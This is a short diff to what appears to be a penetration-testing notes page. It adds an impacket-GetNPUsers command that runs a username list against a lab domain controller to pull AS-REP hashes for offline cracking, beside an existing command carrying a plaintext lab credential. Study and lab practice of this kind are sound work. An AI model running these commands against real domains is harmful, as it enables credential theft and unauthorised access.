@@ -33,10 +33,13 @@ impacket-GetNPUsers hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.
 ```
 {% endcode %}
 
-\
+Use a username list to extract AS-REP hashes:
 
-
-
+{% code overflow="wrap" %}
+```sh
+impacket-GetNPUsers thm.corp/ -usersfile CorpUsers.txt -dc-ip 10.10.96.178 -outputfile asrep_hashes.txt
+```
+{% endcode %}
 
 ## Windows
 
